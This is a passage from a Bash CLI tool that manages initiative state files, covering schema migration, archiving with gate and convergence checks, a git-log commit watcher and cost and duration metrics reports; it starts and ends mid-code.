  rmw_state "$prefix" '.srd_version = $v | .last_updated = $t' --arg v "$version" --arg t "$(now_utc)"
  echo "set srd_version = $version for $prefix"
  write_handoff_internal "$prefix"
}

# ---- Schema migration (EDMV3-T10) -------------------------------------------
# migrate-schema <PREFIX>
# Backfills schema_version onto an existing initiative that predates the enforcement kernel
# (absent schema_version is the legacy signal, EDMV3-T09 AC8). schema_version is otherwise a
# single-writer field (cmd_set refuses it, EDMV3-T09 AC9) -- this is the only writer.
#
# The version written is the highest whose shape requirements the initiative actually
# satisfies, never higher (AC2): version 1 is always satisfiable (it certifies only the
# wave-A gate/phase/artifact shape, which every initiative already has by construction).
# Version 2 (wave B: JSONL findings ledger, closed PARTIAL verdicts) is only reachable when a
# JSONL findings ledger is actually on disk (code-audit/findings-ledger.jsonl, non-empty) and
# every partial_verdict_map entry has moved off "PARTIAL". Version 3 does not exist yet
# (EDMV3-T09 AC8 note: assigned only if a wave-C shape change requires it).
#
# Never lowers schema_version and never touches SRD_ROOT/.archived/ (AC4) -- archived
# initiatives are frozen at whatever version (or absence) they carried when archived.
cmd_migrate_schema() {
  [[ $# -eq 1 ]] || die "usage: edm-state migrate-schema <PREFIX>"
  require_jq
  local prefix="$1"

  # AC4: never touches an archived initiative. state_file_for()/initiative_dir_for() never
  # resolve into SRD_ROOT/.archived/ by design (archived initiatives are inert, EDMV3-111) --
  # so this is checked explicitly, before any other resolution, covering both the flat
  # (.archived/PREFIX/) and product-scoped (.archived/PRODUCT/PREFIX__desc/) archived shapes.
  local archived_hit="" _ms_af
  [[ -f "${SRD_ROOT}/.archived/${prefix}/.edm-state.json" ]] \
    && archived_hit="${SRD_ROOT}/.archived/${prefix}/.edm-state.json"
  if [[ -z "$archived_hit" ]]; then
    for _ms_af in "${SRD_ROOT}"/.archived/*/"${prefix}__"*/.edm-state.json; do
      [[ -f "$_ms_af" ]] && archived_hit="$_ms_af" && break
    done
  fi
  [[ -z "$archived_hit" ]] \
    || die "migrate-schema: refused -- ${prefix} is archived (found at ${archived_hit}); archived initiatives are not migrated"

  local dir state_file
  dir="$(initiative_dir_for "$prefix")"
  state_file="${dir}/.edm-state.json"
  [[ -f "$state_file" ]] || die "migrate-schema: no state file for $prefix at $state_file"

  local state current_version current_version_raw
  state="$(cat "$state_file")"
  current_version_raw="$(echo "$state" | jq -r '.schema_version // empty')"
  current_version="$current_version_raw"
  # Same arithmetic-context injection guard as schema_at_least: this value reaches `-le` and
  # `$(( ))` below. An empty value is legitimate (legacy, no field) and must stay empty so the
  # `[[ -n ... ]]` branch below still distinguishes it. A present-but-non-integer value is coerced
  # to 0 for the arithmetic below -- but the coercion alone would silently normalize a corrupted
  # schema_version DOWN to 1 (target_version=1 always satisfies `1 -le 0`... no, wait: coercion
  # makes current_version=0, and target_version (1 or 2) is never <= 0, so the refusal guard below
  # never fires against a coerced 0, and the file gets stamped schema_version=1). CA-135: refuse
  # rather than guess whenever the coerced value actually differs from what is on disk, and report
  # the RAW value below, not the coerced one, so the operator sees the actual corrupted string.
  if [[ -n "$current_version" ]]; then
    current_version="$(to_int "$current_version" 0)"
    if [[ "$current_version" != "$current_version_raw" ]]; then
      die "migrate-schema: ${prefix} has a non-integer schema_version (${current_version_raw}); repair the state file by hand -- refusing to guess a version"
    fi
  fi

  # ---- Diagnostic report, printed before any confirmation is requested (AC1) -------------
  local current_phase gates_count terminal_phase_ms terminal_completed_at
  current_phase="$(echo "$state" | jq -r '(.current_phase // 0) | if type == "number" then floor else 0 end')"
  gates_count="$(echo "$state" | jq -r '(.gates_approved // []) | length')"
  # Mode-derived terminal phase when mode is recorded; falls back to current_phase for a
  # pre-mode-field legacy file so the report still shows something meaningful rather than
  # erroring on an unrecognized mode.
  local ms_mode ms_lifecycle_mode
  ms_mode="$(echo "$state" | jq -r '.mode // "null"')"
  ms_lifecycle_mode="$(echo "$state" | jq -r '.lifecycle_mode // "standard"')"
  if [[ "$ms_mode" != "null" ]]; then
    terminal_phase_ms="$(terminal_phase_for_mode "$ms_mode" "$ms_lifecycle_mode")"
  else
    terminal_phase_ms="$current_phase"
  fi
  terminal_completed_at="$(echo "$state" | jq -r --arg k "${terminal_phase_ms}_phase" '.phase_durations[$k].completed_at // empty')"

  local ledger_jsonl="${dir}/code-audit/findings-ledger.jsonl"
  local has_jsonl_ledger=false
  [[ -s "$ledger_jsonl" ]] && has_jsonl_ledger=true
  local ledger_format
  if [[ "$has_jsonl_ledger" == "true" ]]; then
    ledger_format="JSONL (${ledger_jsonl})"
  elif [[ -s "${dir}/code-audit/findings-ledger.md" ]]; then
    ledger_format="markdown (${dir}/code-audit/findings-ledger.md)"
  else
    ledger_format="absent"
  fi

  local open_partials
  open_partials="$(echo "$state" | jq -r '
    [(.partial_verdict_map // {}) | to_entries[] | select(.value.verdict == "PARTIAL")] | length
  ' 2>/dev/null || echo 0)"

  # EDMV3-T14: report whether this initiative's last_updated predates WAVE_A_MERGE_DATE, so an
  # operator running migrate-schema sees the grandfathering boundary as a real date rather than
  # having to infer it -- purely informational, does not change target_version below.
  local last_updated_ms predates_wave_a="no"
  last_updated_ms="$(echo "$state" | jq -r '.last_updated // empty')"
  if [[ -n "$last_updated_ms" && "${last_updated_ms:0:10}" < "$WAVE_A_MERGE_DATE" ]]; then
    predates_wave_a="yes"
  fi

  echo "# migrate-schema report for ${prefix}"
  echo "  current_phase:          ${current_phase}"
  echo "  gates_approved:         ${gates_count}"
  echo "  terminal completed_at:  ${terminal_completed_at:-(none)}"
  echo "  findings ledger:        ${ledger_format}"
  echo "  unclosed PARTIAL count: ${open_partials}"
  # CA-135: print the RAW value read from disk, not the coerced one -- if the two ever differ,
  # the branch above already refused before this line is reached, so this is a no-op change on
  # the surviving path and the fix for the case that matters.
  echo "  recorded schema_version: ${current_version_raw:-(absent)}"
  echo "  predates wave-A merge (${WAVE_A_MERGE_DATE}): ${predates_wave_a}"

  # ---- AC2: honest version -- the highest shape this initiative actually satisfies -------
  local target_version=1
  if [[ "$has_jsonl_ledger" == "true" && "$open_partials" -eq 0 ]]; then
    target_version=2
  fi

  # ---- AC3: refuse when already migrated, unless a higher shape is now satisfied --------
  if [[ -n "$current_version" ]]; then
    if [[ "$target_version" -le "$current_version" ]]; then
      die "migrate-schema: ${prefix} already has schema_version=${current_version}; refusing (no higher shape is currently satisfied)"
    fi
    # Advance by exactly one -- never skip a version even if the computed target is higher.
    target_version=$((current_version + 1))
    echo "  advancing schema_version: ${current_version} -> ${target_version}"
  else
    echo "  proposed schema_version: ${target_version}"
  fi
  echo

  # Confirmation, read from stdin so a test can pipe "yes" non-interactively (the technical
  # note requires this): `read` returns non-zero / an empty line at EOF when stdin is closed
  # and nothing was piped, which the check below refuses rather than proceeds on.
  printf "Type 'yes' to stamp schema_version=%s onto %s: " "$target_version" "$prefix"
  local reply=""
  read -r reply || true
  [[ "$reply" == "yes" ]] \
    || die "migrate-schema: confirmation not received (expected 'yes'); no changes made"

  rmw_state "$prefix" '.schema_version = ($v | tonumber) | .last_updated = $t' \
    --arg v "$target_version" --arg t "$(now_utc)"
  echo "migrated ${prefix}: schema_version = ${target_version}"
  write_handoff_internal "$prefix"
}

cmd_archive() {
  [[ $# -eq 1 ]] || die "usage: edm-state archive <PREFIX>"
  require_jq
  local prefix="$1"
  local src dst product_name=""
  src="$(initiative_dir_for "$prefix")"
  [[ -d "$src" ]] || die "no initiative directory at $src"

  # Lifecycle verification (EDMV3-T12, wave-A sub-checks; EDMV3-17 AC1a-AC1d, AC2-AC9). Checks
  # run in this order -- gates, terminal phase, completed_at, convergence -- so the refusal a
  # user sees is the earliest unmet condition, the most actionable one. No override flag of
  # any kind exists anywhere in this function (AC12); an unrecognized extra argument is
  # refused by the `[[ $# -eq 1 ]]` usage check above.
  #
  # The two non-refusing early exits are exactly: a missing state file (AC10, now reported
  # rather than silently permitted) and legacy state with no schema_version (below; EDMV3-T14
  # lands the end-to-end degradation class, this ticket implements its own).
  #
  # EDMV3-T18 (wave B): AC1e (PARTIAL-closure check) and AC1f (computed convergence via
  # `audit-converged`) are implemented below, after the wave-A gates/phase/convergence
  # checks, gated on their own schema_version >= 2 threshold -- independent of arch_class1
  # below, which only requires >= 1 -- so a wave-A initiative (schema_version: 1) still
  # warn-and-proceeds through these two wave-B-only checks by name (EDMV3-T14 AC6
  # three-valued model). No override flag exists for either check (AC10); an unrecognized
  # extra CLI argument is already refused by the `[[ $# -eq 1 ]]` usage guard above.
  local state_file
  state_file="${src}/.edm-state.json"

  if [[ ! -f "$state_file" ]]; then
    # AC10: a missing state file is reported, not silently permitted.
    echo "edm-state archive: info  MISSING_STATE_FILE  .edm-state.json  no state file found at ${state_file}; proceeding with an unchecked directory move (gates, phase and convergence cannot be verified)" >&2
  else
    local state_json mode lifecycle_mode converged schema_version_arch arch_class1
    state_json="$(cat "$state_file" 2>/dev/null || echo '{}')"
    mode="$(echo "$state_json" | jq -r '.mode // "null"')"
    lifecycle_mode="$(echo "$state_json" | jq -r '.lifecycle_mode // "standard"')"
    product_name="$(echo "$state_json" | jq -r '.product_name // ""')"
    schema_version_arch="$(echo "$state_json" | jq -r '.schema_version // empty')"
    # requires schema_version >= 1 (EDMV3-17, EDMV3-T09 AC10) -- uses the shared
    # schema_at_least() three-valued helper (EDMV3-T14) rather than re-deriving the
    # absent/below/at-or-above comparison here.
    arch_class1="$(schema_at_least "$schema_version_arch" 1)"

    if [[ "$arch_class1" == "0" ]]; then
      # C-4: legacy state predating schema_version warns and proceeds through every new
      # wave-A check below (gates, terminal phase, completed_at, convergence) -- it keeps the
      # pre-T12 convergence behaviour (product_name-gated) since that is the only check that
      # existed for it before this ticket.
      echo "edm-state archive: [warn] legacy initiative (no schema_version) -- skipping wave-A lifecycle checks" >&2
      # EDMV3-T62 AC5: persist the skip to state, not just this transient console line.
      record_degraded_check "$prefix" "archive:wave-a-lifecycle-checks" "no schema_version"
      if echo "$state_json" | jq -e 'has("code_audit_converged")' >/dev/null 2>&1; then
        converged="$(read_bool "$state_json" "code_audit_converged" "false")"
      else
        converged="absent"
      fi
      if [[ "$converged" == "false" && -n "$product_name" ]]; then
        die "archive refused: code_audit_converged=false; run /edm:code-audit ${prefix} and ensure REMEDIATION.md convergence before archiving"
      fi
      # converged == "true" or "absent": proceed silently, matching pre-T12 behaviour.
    else
      # ---- AC1a: every gate required_gates_for_mode() returns must be approved ----------
      if [[ "$mode" != "null" ]]; then
        local skipped_phases_str_arch required_gates_list_arch missing_gates="" g approved_g
        skipped_phases_str_arch="$(echo "$state_json" | jq -r '[(.skipped_phases // [])[].phase] | join(" ")')"
        required_gates_list_arch="$(required_gates_for_mode "$mode" "$lifecycle_mode" "$skipped_phases_str_arch")"
        # shellcheck disable=SC2086 -- deliberate word-splitting; result is a space-separated list of gate numbers
        for g in $required_gates_list_arch; do
          approved_g="$(echo "$state_json" | jq -r --argjson gg "$g" '(.gates_approved // []) | map(select(.gate == $gg)) | length')"
          [[ "$approved_g" -gt 0 ]] || missing_gates="${missing_gates}${missing_gates:+, }${g}"
        done
        if [[ -n "$missing_gates" ]]; then
          die "archive refused: gate(s) ${missing_gates} not approved for ${prefix}; run edm-state approve-gate ${prefix} <gate-num> for each missing gate"
        fi

        # ---- AC1b: current_phase equals the mode-derived terminal phase, never hardcoded --
        local terminal_phase_arch current_phase_arch
        terminal_phase_arch="$(terminal_phase_for_mode "$mode" "$lifecycle_mode")"
        current_phase_arch="$(echo "$state_json" | jq -r '(.current_phase // 0) | if type == "number" then floor else 0 end')"
        [[ "$current_phase_arch" == "$terminal_phase_arch" ]] \
          || die "archive refused: current_phase (${current_phase_arch}) has not reached the terminal phase (${terminal_phase_arch}) for ${prefix} (mode=${mode})"

        # ---- AC1c: the terminal phase's completed_at is recorded --------------------------
        local terminal_completed_at_arch
        terminal_completed_at_arch="$(echo "$state_json" | jq -r --arg k "${terminal_phase_arch}_phase" '.phase_durations[$k].completed_at // empty')"
        [[ -n "$terminal_completed_at_arch" ]] \
          || die "archive refused: phase ${terminal_phase_arch} has no completed_at recorded for ${prefix}; run edm-state phase-complete ${prefix} ${terminal_phase_arch}"
      fi

      # ---- AC1d/AC8/AC9: convergence, with the prototype and fast-track/fix-pack exemptions --
      # Both halves of the exemption come from convergence_exempt(), which is shared with
      # cmd_audit_converged so the two cannot drift.
      if [[ "$(convergence_exempt "$mode" "$lifecycle_mode")" == "true" ]]; then
        # CA-069: convergence_exempt() returns true for two independent reasons -- mode has no
        # code-audit phase at all, OR lifecycle_mode is fast-track/fix-pack (in which case mode
        # itself is irrelevant) -- so naming only mode here was actively misleading for a
        # standard-mode/fast-track initiative (the exact mode that normally REQUIRES this check).
        # Name both fields, matching the phrasing the recorded-exemption line below already uses.
        echo "[warn] no code-audit round in this phase graph (mode=${mode}, lifecycle_mode=${lifecycle_mode}) -- skipping the convergence check" >&2
        # AC9: record the exemption reason in state rather than skipping silently, and echo it
        # too so the CLI output itself (not only the state file) documents why no code-audit
        # gate was demanded of this lifecycle.
        echo "recorded CONVERGENCE_NOT_REQUIRED for ${prefix} (phase graph has no code-audit round: mode=${mode}, lifecycle_mode=${lifecycle_mode})"
        rmw_state "$prefix" \
          '.archive_exemptions = (((.archive_exemptions // []) + ["CONVERGENCE_NOT_REQUIRED"]) | unique) | .last_updated = $t' \
          --arg t "$(now_utc)"
      else
        if echo "$state_json" | jq -e 'has("code_audit_converged")' >/dev/null 2>&1; then
          converged="$(read_bool "$state_json" "code_audit_converged" "false")"
        else
          converged="absent"
        fi
        if [[ "$converged" == "absent" ]]; then
          echo "[warn] legacy initiative -- code_audit_converged not set; proceeding" >&2
          # EDMV3-T62 AC5: persist the skip to state, not just this transient console line.
          record_degraded_check "$prefix" "archive:code-audit-convergence-check" "code_audit_converged not set"
        elif [[ "$converged" == "false" ]]; then
          # AC5: the refusal is unconditional on product_name -- the `-n "$product_name"`
          # conjunct that let a flat-layout initiative archive with no refusal at all is
          # deleted here (CHANGELOG-recorded behaviour change).
          # This branch checks the code_audit_converged boolean set by cmd_approve_gate's
          # code-audit branch, which itself evaluates the shared BLOCKING_FILTER predicate
          # (EDMV3-T28 AC9) -- archive is the third named consumer of that one definition.
          # A direct ledger re-query (via `audit-converged`) runs separately below as
          # EDMV3-T18's AC1f wave-B sub-check; not duplicated here so the two checks stay
          # on their own lines and their own schema-gating.
          die "archive refused: code_audit_converged=false; run edm-state approve-gate ${prefix} code-audit before archiving"
        fi
        # converged == "true": proceed silently.
      fi
    fi

    # ---- EDMV3-T18 AC1e/AC1f: wave-B sub-checks, gated on schema_version >= 2 --------------
    # Runs regardless of which arch_class1 branch above was taken (legacy no-schema-version,
    # or schema_version present) -- both degrade identically here (AC6): only schema_version
    # >= 2 gets full enforcement; absent and schema_version=1 both warn-and-proceed, naming
    # each of the two checks skipped.
    local archive_schema_class2
    archive_schema_class2="$(schema_at_least "$schema_version_arch" 2)"

    if [[ "$archive_schema_class2" != "2" ]]; then
      echo "edm-state archive: [warn] schema_version ${schema_version_arch:-absent} < 2 -- skipping PARTIAL-closure check for ${prefix}" >&2
      record_degraded_check "$prefix" "archive:partial-closure-check" "schema_version ${schema_version_arch:-absent} < 2"
      echo "edm-state archive: [warn] schema_version ${schema_version_arch:-absent} < 2 -- skipping audit-converged re-query for ${prefix}" >&2
      record_degraded_check "$prefix" "archive:audit-converged-recheck" "schema_version ${schema_version_arch:-absent} < 2"
    else
      # ---- AC1e/AC2/AC3/AC4: every partial_verdict_map entry must be closed PASS. An entry
      # is still open when it carries the original `verdict == "PARTIAL"` shape (never
      # closed); an entry closed FAIL also blocks (AC3) since a failed runtime verification
      # is itself a FAIL finding that must be remediated -- there is no third closure
      # verdict (EDMV3-T32 AC9 already refuses any closing verdict but PASS/FAIL).
      local open_partials_list
      open_partials_list="$(echo "$state_json" | jq -r '
        (.partial_verdict_map // {}) | to_entries[] |
        if (.value.verdict == "PARTIAL") then
          "  \(.key): open (recorded \(.value.recorded_at // "?")) -- \(.value.note // "(no note)")"
        elif (.value.closing_verdict == "FAIL") then
          "  \(.key): FAIL-closed (\(.value.closed_at // "?")) -- \(.value.verification_ref // "(no ref)")"
        else empty end
      ' 2>/dev/null || true)"
      if [[ -n "$open_partials_list" ]]; then
        die "archive refused: unclosed or FAIL-closed PARTIAL verdict(s) for ${prefix}; run /edm:verify-runtime ${prefix} to close each before archiving -- no override exists:
${open_partials_list}"
      fi

      # ---- AC1f/AC5: re-query convergence from the ledger via the shared audit-converged
      # command rather than trusting the cached code_audit_converged boolean alone, closing
      # the time-of-check-to-time-of-use window the same way cmd_approve_gate's code-audit
      # branch already does. Exit 3 ("no ledger") is not a refusal condition here -- it
      # degrades to warn-and-proceed (Technical Notes); exit 1 (blocking findings, or an
      # unknown/partial round) refuses.
      local ac_recheck_out ac_recheck_ec=0
      ac_recheck_out="$(cmd_audit_converged "$prefix" 2>&1)" || ac_recheck_ec=$?
      case "$ac_recheck_ec" in
        0) : ;;
        3)
          echo "edm-state archive: [warn] audit-converged re-query found no findings ledger for ${prefix} -- proceeding (${ac_recheck_out})" >&2
          record_degraded_check "$prefix" "archive:audit-converged-recheck" "no findings-ledger.jsonl (audit-converged exit 3)"
          ;;
        *)
          die "archive refused: audit-converged re-query failed for ${prefix} (exit ${ac_recheck_ec}): ${ac_recheck_out}; resolve the audit-converged failure before archiving (remediate findings / rerun a full round, or repair the findings ledger data)"
          ;;
      esac
    fi
  fi

  # Determine archive destination: preserve product-scoped layout when applicable.
  if [[ -n "$product_name" ]]; then
    dst="${SRD_ROOT}/.archived/${product_name}/$(basename "$src")"
  else
    dst="${SRD_ROOT}/.archived/${prefix}"
  fi
  mkdir -p "$(dirname "$dst")"

  # G46: hold the state lock across the rename itself, instead of moving the directory
  # (which may contain a live lockdir/lockfile from a concurrent with_state_lock caller)
  # with no lock of our own held. The locked body performs the rename itself -- it must
  # NOT call rmw_state or take a second, nested lock (with_state_lock is not reentrant).
  # Use git mv when inside a git worktree so the move is tracked; fall back to plain mv. (CA-015)
  with_state_lock "${state_file%.json}" _cmd_archive_move_body "$src" "$dst" "${state_file%.json}"
  echo "archived $prefix -> $dst"
}

# _cmd_archive_move_body <src> <dst> <lockbase>   (runs INSIDE with_state_lock; see
# cmd_archive above, which acquires the lock and dispatches here)
# G17 (CA-206, replaces the G46 pre-rename cleanup this comment used to describe): rename the
# directory FIRST, then remove the lock names at the DESTINATION path. The pre-rename order
# opened a TOCTOU window between the two process launches this function's two statements
# actually require under the hood (git_aware_mv's own `git rev-parse`, then `git mv`): a fresh
# contender could mkdir a brand-new, live lockdir at the SAME source path in that window, and
# this process's caller (with_state_lock, after this body returns) then runs an unconditional
# `rm -rf "$lockdir"` at that same original path -- deleting the contender's live lockdir out
# from under it (CA-141's exact class, one function away). The lock files live inside the
# initiative directory itself (alongside .edm-state.json), so they travel with `git_aware_mv`
# automatically; renaming first means this process is the only one that ever holds a lock at
# the destination path, and the source path is never a live lock target again once the
# directory has left it. Removing the lock names at the destination remains a narrow, deliberate
# exception to CA-169's "never rm -f the flock lockfile" rule (with_state_lock above): CA-169
# exists because unlinking a lock file while its PATH can still be reopened leaves a window for
# a fresh contender to acquire a second, independent lock on the same logical resource while an
# earlier holder still believes it holds the first one -- but this initiative directory is being
# permanently archived, so no future with_state_lock caller should ever target this path again.
_cmd_archive_move_body() {
  local _src="$1" _dst="$2" _lockbase="$3"
  git_aware_mv "$_src" "$_dst"
  local _dst_lockbase="${_dst}${_lockbase#"$_src"}"
  # G25 (CA-256): also sweep the G49 flock-timeout marker glob (${lockbase}.lock.timeout.<pid>),
  # which matches neither ".lockd" nor a bare ".lock" and would otherwise be left behind at the
  # archived destination.
  rm -rf "${_dst_lockbase}.lockd" "${_dst_lockbase}.lock"
  # G15/CA-256 (round 5): the glob for the marker sweep was previously a THIRD, unquoted `rm -rf`
  # argument -- word-splittable on any space in $_dst_lockbase (srd_root and product_name are not
  # charset-validated against spaces), which could silently defeat this cleanup or hand rm -rf a
  # truncated path. Loop the glob (safe: a `for` expansion iterates matched names, it does not
  # word-split them) with a per-file existence test, since an unmatched glob with nullglob unset
  # yields the literal pattern string as the sole "match." G17/CA-305 (round 5) moved the
  # marker's home to TMPDIR, so a marker created from here on never lands inside an initiative
  # directory to begin with -- this sweep is kept regardless, as a backward-compatible cleanup
  # for any pre-G17 marker a not-yet-upgraded run may have left behind before this directory is
  # archived.
  local _archive_timeout_marker
  for _archive_timeout_marker in "${_dst_lockbase}".lock.timeout.*; do
    [[ -e "$_archive_timeout_marker" ]] || continue
    rm -f "$_archive_timeout_marker"
  done
}

cmd_watch_impl() {
  # Called by the monitor during /edm:implement. Tails git log for new commits
  # referencing any {PREFIX}-T{NN} ticket ID. Emits one line per new commit so
  # the monitor delivers it as a notification.
  command -v git >/dev/null 2>&1 || { echo "git not available"; return 0; }
  git rev-parse --is-inside-work-tree >/dev/null 2>&1 || { echo "edm-state watch-impl: current directory is not inside a git worktree" >&2; return 1; }
  local last_sha
  last_sha="$(git rev-parse --verify HEAD 2>/dev/null || echo '')"
  [[ -n "$last_sha" ]] || { echo "edm-state watch-impl: repository has no commits yet" >&2; return 1; }
  while true; do
    sleep 5
    # G48: capture git log's OWN exit status separately from grep's -- piping straight into
    # `grep ... || true` previously collapsed "no new commits" (git log succeeded, grep found
    # nothing), "git log genuinely failed", and "last_sha is no longer a valid ref" (e.g. after
    # a rebase/amend that made the old commit unreachable and later pruned) into one
    # indistinguishable silent outcome -- once history was rewritten, every later poll silently
    # produced nothing for the rest of the session with no diagnostic connecting cause to effect.
    local git_log_out git_log_ec=0
    git_log_out="$(git log --pretty=format:'%h %s' "${last_sha}..HEAD" 2>/dev/null)" || git_log_ec=$?
    if [[ $git_log_ec -ne 0 ]]; then
      if git cat-file -e "${last_sha}^{commit}" 2>/dev/null; then
        # last_sha is still a valid ref -- git log failed for some other, presumably
        # transient reason. Leave last_sha unchanged and retry on the next poll.
        :
      else
        # last_sha is no longer reachable: history was rewritten (rebase/amend) and the old
        # commit was pruned. Re-anchor at the current HEAD and say so once, rather than
        # silently producing nothing for the rest of the session.
        echo "edm-state watch-impl: history was rewritten (${last_sha} is no longer a valid ref); monitor re-anchored at current HEAD" >&2
        last_sha="$(git rev-parse HEAD 2>/dev/null || echo "$last_sha")"
      fi
      continue
    fi
    local new_commits
    new_commits="$(printf '%s' "$git_log_out" | grep -E '[A-Z]+-T[0-9]+' || true)"
    [[ -n "$new_commits" ]] && echo "$new_commits"
    # G48: advance last_sha to HEAD on every SUCCESSFUL poll, not only when a ticket-commit
    # match was found, so a long run of non-ticket commits does not make the scanned range
    # (and therefore each poll's git-log cost) grow unboundedly.
    last_sha="$(git rev-parse HEAD 2>/dev/null || echo "$last_sha")"
  done
}

cmd_metrics_report() {
  require_jq
  local arg="${1:-}"
  # EDMV3-T53 AC1/AC3: the human-baseline comparison is opt-in everywhere it can render (--all
  # and the per-prefix report both honor it), not a per-mode special case. --calibrate has no
  # baseline concept and ignores this flag either way.
  local with_baseline="false"
  [[ "${2:-}" == "--with-human-baseline" ]] && with_baseline="true"
  case "$arg" in
    --all)
      [[ -d "$SRD_ROOT" ]] || { echo "no SRD/ directory"; return 0; }
      echo "# EDM Metrics - Aggregate"
      echo
      if [[ "$with_baseline" == "true" ]]; then
        printf "  %-12s  %-8s  %-10s  %-12s  %-12s  %-12s\n" "Initiative" "Size" "Total Time" "Claude Cost" "Human Cost" "Cost Ratio"
        printf "  %-12s  %-8s  %-10s  %-12s  %-12s  %-12s\n" "----------" "----" "----------" "-----------" "----------" "----------"
      else
        printf "  %-12s  %-8s  %-10s  %-12s\n" "Initiative" "Size" "Total Time" "Claude Cost"
        printf "  %-12s  %-8s  %-10s  %-12s\n" "----------" "----" "----------" "-----------"
      fi
      while IFS= read -r state; do
        if [[ "$with_baseline" == "true" ]]; then
          jq -r '
            [.phase_durations | to_entries[] | .value] as $phases |
            {
              prefix: .prefix,
              size: (.estimated_size // "?"),
              total_seconds: ([$phases[].duration_seconds // 0] | add // 0),
              total_claude: ([$phases[].estimated_cost_usd // 0] | add // 0),
              total_human: ([$phases[].human_baseline_usd // 0] | add // 0)
            }
            | "  \(.prefix | tostring | .[0:12])  \(.size | tostring | .[0:8])  \(.total_seconds)s\(if .total_seconds < 100 then "         " else "       " end)  $\(.total_claude)\(if .total_claude < 10 then "        " else "      " end)  $\(.total_human)\(if .total_human < 100 then "       " else "     " end)  \(if .total_claude > 0 and .total_human > 0 then ((.total_human / .total_claude) | tostring | .[0:6]) + "x" else "n/a" end)"
          ' "$state" 2>/dev/null
        else
          jq -r '
            [.phase_durations | to_entries[] | .value] as $phases |
            {
              prefix: .prefix,
              size: (.estimated_size // "?"),
              total_seconds: ([$phases[].duration_seconds // 0] | add // 0),
              total_claude: ([$phases[].estimated_cost_usd // 0] | add // 0)
            }
            | "  \(.prefix | tostring | .[0:12])  \(.size | tostring | .[0:8])  \(.total_seconds)s\(if .total_seconds < 100 then "         " else "       " end)  $\(.total_claude)"
          ' "$state" 2>/dev/null
        fi
      done < <(list_state_files --archived)
      echo
      if [[ "$with_baseline" == "true" ]]; then
        echo "Cost Ratio = human_cost / claude_cost (higher = more savings vs. human team baseline). human_baseline_usd is an ESTIMATE derived from Phase Timing Guidelines median hours x human_hourly_rate_usd -- not a measured figure."
      fi
      ;;
    --calibrate)
      [[ -d "$SRD_ROOT" ]] || { echo "no SRD/ directory"; return 0; }
      echo "# EDM Calibration - suggested updates to Phase Timing Guidelines"
      echo
      echo "Computed from completed initiatives (active + archived). Median values per (size, phase)."
      echo
      local _calib_files=()
      while IFS= read -r _f; do _calib_files+=("$_f"); done < <(list_state_files --archived)
      # G12/CA-261 (round 5, third pass): G30's guard tested `estimated_size != null`, but
      # `_cmd_init_render` seeds the literal string "Unknown" at init -- which IS non-null --
      # so every state file satisfied that guard regardless of whether estimated_size was ever
      # really set, making it functionally identical to the raw file count it was meant to
      # replace. The renderer's own predicate additionally requires non-empty phase_durations
      # (seeded empty at init), which the guard never checked at all, so --calibrate could still
      # print a bare header with nothing under it on any repository where no phase had
      # completed -- CA-261's original symptom. This guard now derives from the EXACT same
      # `select()` the renderer uses below, with an explicit exclusion of the "Unknown"
      # sentinel, and counts the phase_durations entries the renderer actually groups (summed
      # across every qualifying file) rather than the qualifying FILE count -- a qualifying file
      # with an empty phase_durations object contributes zero rows and must not pass the guard.
      local _calib_row_count=0
      if [[ ${#_calib_files[@]} -gt 0 ]]; then
        _calib_row_count="$(jq -s -r '
          [.[] | select(.estimated_size != null and .estimated_size != "Unknown") |
            (.phase_durations // {}) | to_entries | length
          ] | add // 0
        ' "${_calib_files[@]}" 2>/dev/null || echo 0)"
      fi
      if [[ "$_calib_row_count" -eq 0 ]]; then
        echo "  (insufficient data - need at least one completed initiative with estimated_size set)"
      else
        jq -s -r '
          [.[] | select(.estimated_size != null and .estimated_size != "Unknown") | . as $i |
            (.phase_durations | to_entries[] | {
              size: $i.estimated_size,
              phase: (.key | sub("_phase$"; "")),
              duration: (.value.duration_seconds // 0),
              cost: (.value.estimated_cost_usd // 0)
            })
          ]
          | group_by(.size + "_" + .phase)
          | map({
              key: .[0].size + "_phase_" + .[0].phase,
              count: length,
              median_duration_s: ((sort_by(.duration) | .[length / 2 | floor].duration)),
              median_cost_usd: ((sort_by(.cost) | .[length / 2 | floor].cost))
            })
          | .[]
          | "  \(.key): n=\(.count), median_duration=\(.median_duration_s)s, median_cost=$\(.median_cost_usd)"
        ' "${_calib_files[@]}" 2>/dev/null || \
          echo "  (error building the calibration report -- check for malformed state files; the row-count guard above already confirmed qualifying data exists)"
      fi
      ;;
    "")
      die "usage: edm-state metrics-report <PREFIX|--all|--calibrate>"
      ;;
    *)
      local prefix="$arg"
      local state
      state="$(state_file_for "$prefix")"
      [[ -f "$state" ]] || die "no state for $prefix"
      echo "# EDM Metrics - $prefix"
      echo
      # CA-160: pass the rate as jq DATA (--arg), never spliced into the program string -- a
      # value containing '"' or '\(' would otherwise break the program or be interpreted as a
      # nested jq expression. Same treatment every sibling numeric value gets via awk -v.
      jq -r --arg rate "$HUMAN_HOURLY_RATE_USD" '"Initiative: \(.prefix)  |  size: \(.estimated_size // "Unknown")  |  current phase: \(.current_phase)  |  human hourly rate: $\($rate)"' "$state"
      jq -r 'if (.product_name // "") != "" or (.initiative_description // "") != "" then "Product: \(.product_name // "(none)")  |  Description: \(.initiative_description // "(none)")" else empty end' "$state" 2>/dev/null || true
      echo
      # EDMV3-T53 AC1: default output is raw cost/duration only -- no human-baseline comparison
      # or multiple. AC3: --with-human-baseline is the explicit opt-in that restores it, with
      # its own caveat line stating the baseline is an estimate.
      if [[ "$with_baseline" == "true" ]]; then
        printf "  %-10s  %-10s  %-12s  %-12s  %-10s  %-12s  %-10s\n" "Phase" "Duration" "Claude Cost" "Human Cost" "Savings" "Tokens (i/o)" "Model"
        printf "  %-10s  %-10s  %-12s  %-12s  %-10s  %-12s  %-10s\n" "-----" "--------" "-----------" "----------" "-------" "------------" "-----"
        jq -r '
          .phase_durations
          | to_entries
          | sort_by(.key)
          | .[]
          | .key as $k
          | .value as $v
          | ("Phase " + ($k | sub("_phase$"; ""))) as $phase_label
